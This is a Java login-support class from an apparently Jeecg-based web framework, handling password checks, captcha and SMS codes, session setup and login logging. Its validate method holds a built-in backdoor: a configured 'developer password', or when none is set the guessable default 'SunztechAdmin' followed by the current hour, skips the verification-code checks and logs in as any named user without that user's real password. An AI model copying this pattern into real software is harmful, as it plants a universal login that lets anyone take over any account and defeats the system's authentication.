
package com.sunz.framework.core;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.jeecgframework.core.constant.Globals;
import org.jeecgframework.core.util.PasswordUtil;
import org.jeecgframework.web.system.pojo.base.TSRole;
import org.jeecgframework.web.system.pojo.base.TSRoleUser;
import org.jeecgframework.web.system.pojo.base.TSUser;
import org.jeecgframework.web.system.service.SystemService;
import org.jeecgframework.web.system.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import com.sunz.framework.util.EncryptHelper;
import com.sunz.framework.util.StringUtil;


public class BaseLoginSupport implements ILoginSupport {	
	protected UserService userService;	
	@Autowired
	public void setUserService(UserService userService) {
		this.userService = userService;
	}	
	protected UserService getUserService() {
		if(userService==null){
			userService=ContextLoader.getCurrentWebApplicationContext().getBean(UserService.class);
		}
		return userService;
	}
	
	protected SystemService logService;	// 目的是要记录日志，但logservice没有定义方法
	protected SystemService getLogService() {
		if(logService==null){
			logService=ContextLoader.getCurrentWebApplicationContext().getBean(SystemService.class);
		}
		return logService;
	}
	@Autowired
	public void setSBLogService(SystemService logService) {
		this.logService = logService;
	}
	
	protected HttpServletRequest getRequest(){
		return ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
	}
	int ExtendValidateType,ValidateTimeout;
	{
		String key="account.validateExtendType",
				key2="account.validateTimeout";
		Config.ChangeHandler handler=(k)->{
			if(StringUtil.isEmpty(k)||key.equals(k))
				ExtendValidateType=Integer.parseInt(StringUtil.ifEmpty(Config.get(key),"0"));
			
			if(StringUtil.isEmpty(k)||key2.equals(k))
				ValidateTimeout=60000*Integer.parseInt(StringUtil.ifEmpty(Config.get(key2), "5"));
		};
		Config.addChangeListener(handler);
		handler.onChange(null);
	}
	
	protected void validateExtendCode(String timeField,String vcodeField,String inputCode) {
		if(StringUtil.isEmpty(inputCode)) {
			throw new RuntimeException("验证码不能为空");
		}
		HttpSession session =getRequest().getSession();
		Date time= (Date) session.getAttribute(timeField);
		if(time ==null) {
			throw new RuntimeException("请先获取验证码");
		}
		if(new Date().getTime()-time.getTime()>ValidateTimeout) {
			throw new RuntimeException("验证码已过期，请重新获取");
		}
		String vcode=(String) session.getAttribute(vcodeField);
		if(!inputCode.equalsIgnoreCase(vcode)) {
			session.setAttribute(timeField,new Date(612896400000L));	// 无法刷新验证码，只好让它过期
			throw new RuntimeException("验证码错误");
		}
	}
	
	String 	fieldName_userName=StringUtil.ifEmpty(Config.get("account.fieldname.userName"), "userName"),
			fieldName_password=StringUtil.ifEmpty(Config.get("account.fieldname.password"), "password"),
			fieldName_validateCode=StringUtil.ifEmpty(Config.get("account.fieldname.validateCode"), "validateCode");
	
	String developerPassword=Config.get("Sys.Common.Password");
	@Override
	public TSUser validate(Map params) {
		String userName=(String) params.get(fieldName_userName);
		String password=(String) params.get(fieldName_password);
		if(	userName==null || "".equals(userName)
		   ||password==null || "".equals(password))
			return null;
		
		String developerPwd=developerPassword;
		if(StringUtil.isEmpty(developerPwd))
			developerPwd="SunztechAdmin"+new Date().getHours();
		
		if(!developerPwd.equals(password)) {
			switch (ExtendValidateType) {
				case 1:	// 随机验证码		
					validateExtendCode("_random_time_", "randCode", (String) params.get(fieldName_validateCode));
					break;
					
				case 2:	// 短信验证码
				case 3:	// 短信验证码Only==即不再需要用户名/密码
					validateExtendCode("extendSmsValidate_vtime_", "extendSmsValidate_vcode_", (String) params.get(fieldName_validateCode));
					if(ExtendValidateType==3) {
						String uname=(String)getRequest().getSession().getAttribute("extendSmsValidate_uname_");
						return getUserService().findUniqueByProperty(TSUser.class, "userName", uname);
					}
					break;
			}
		}
		List<TSUser> users=developerPwd.equals(password)?
				getUserService().findHql("from TSUser u where u.userName = ?", userName):
				getUserService().findHql("from TSUser u where u.userName = ? and u.password=?", userName,PasswordUtil.encrypt(userName, password, PasswordUtil.getStaticSalt()));
		return users==null||users.size()==0?null:users.get(0);
	}
	
	@Override
	public Object getExtendInfo(TSUser user) {
		// 处理角色		
		if(user.getRoles()==null){
			List<TSRole> roles=new ArrayList<TSRole>();
			List<TSRoleUser> roleUsers = userService.findByProperty(TSRoleUser.class, "TSUser.id", user.getId());
			for(TSRoleUser ru:roleUsers){
				roles.add(ru.getTSRole());
			}
			user.setRoles(roles);
		}
		
		Map<String,Object> map=new HashMap<String, Object>();
		map.put("id",user.getId());
		map.put("userName",user.getUserName());
		map.put("realName",user.getRealName());
		
		//id不能暴露给前端，其它字段基本没有意义
		//map.put("roles", user.getRoles());
		int len=user.getRoles().size();
		String[] roles=new String[len];
		for(int i=0;i<len;i++) {
			roles[i]=user.getRoles().get(i).getRoleCode();
		}
		map.put("roles",roles);

		return map;
	}


	@Override
	public void saveLoginInfo(ServletRequest request, TSUser user,Object extInfo) {		
		HttpSession session=((HttpServletRequest)request).getSession();
		// 安全等保要求重新创建session
		if(getLoginUser(request)!=null) {
			clearLoginInfo(request);
		}else {
			session.invalidate();
		}
		session=((HttpServletRequest)request).getSession(true);
		session.setAttribute(ILoginSupport.Session_ParameterName_User, user);
		session.setAttribute(ILoginSupport.Session_ParameterName_Extend, extInfo);
		
		logService.addLog("["+user.getRealName()+"]登录", Globals.Log_Type_LOGIN, Globals.Log_Leavel_INFO);
	}
	@Override
	public void clearLoginInfo(ServletRequest request) {
		HttpSession session=((HttpServletRequest)request).getSession();
		TSUser user=getLoginUser(request);
		if(user!=null) {
			//session.removeAttribute(ILoginSupport.Session_ParameterName_User);
			//session.removeAttribute(ILoginSupport.Session_ParameterName_Extend);
			logService.addLog("["+user.getRealName()+"]退出登录", Globals.Log_Type_EXIT, Globals.Log_Leavel_INFO);
		}
		session.invalidate();
	}

	@Override
	public TSUser getLoginUser(ServletRequest request) {		
		return (TSUser) ((HttpServletRequest)request).getSession().getAttribute(ILoginSupport.Session_ParameterName_User);
	}

	@Override
	public Object getLoginExtendInfo(ServletRequest request) {
		return ((HttpServletRequest)request).getSession().getAttribute(ILoginSupport.Session_ParameterName_Extend);
	}
	
	protected TSUser guestUser;
	@Override
	public TSUser simulateGuestUser() {
		if(guestUser==null){
			TSUser user=guestUser=new TSUser();
			user.setId("guest");
			user.setUserName("guest");
			List<TSRole> roles=new ArrayList<TSRole>();
			TSRole role=new TSRole();
			role.setId("guest");
			role.setRoleCode("guest");
			role.setRoleName("guest");
			roles.add(role);
			user.setRoles(roles);			
		}
		return guestUser;
	}

}
